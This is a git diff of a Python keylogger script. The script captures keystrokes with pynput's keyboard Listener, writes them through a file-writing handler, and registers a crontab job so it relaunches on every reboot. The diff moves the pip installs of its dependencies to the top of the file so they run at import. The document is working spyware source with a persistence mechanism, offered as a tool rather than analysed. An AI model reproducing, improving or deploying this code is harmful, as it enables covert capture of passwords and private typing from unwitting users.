@@ -1,8 +1,13 @@
 #Import Key and Listener module
-from pynput.keyboard import Key, Listener
-from crontab import CronTab
 import subprocess
 import sys
+
+subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
+subprocess.check_call([sys.executable, "-m", "pip", "install", "python-crontab"])
+
+from pynput.keyboard import Key, Listener
+from crontab import CronTab
+
 
 print('''________                 __  .__              __                 __    
 \______ \   ____ _____ _/  |_|  |__   _______/  |________  ____ |  | __\_____  \ 
@@ -48,18 +53,13 @@ def write_file(key):
 def on_release(key):
   if key==Key.esc:
     return my_bool
-   
-def install_packages():
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-crontab"])
-   
+      
 def cron():
     my_cron = CronTab(user=True)
     job = my_cron.new(command='python <FILEPATH>')  # edit filepath to location of keylogger download
     job.every_reboot()
     my_cron.write()
-  
-install_packages()
+
 cron()
     
 #Will continously loop through until broken
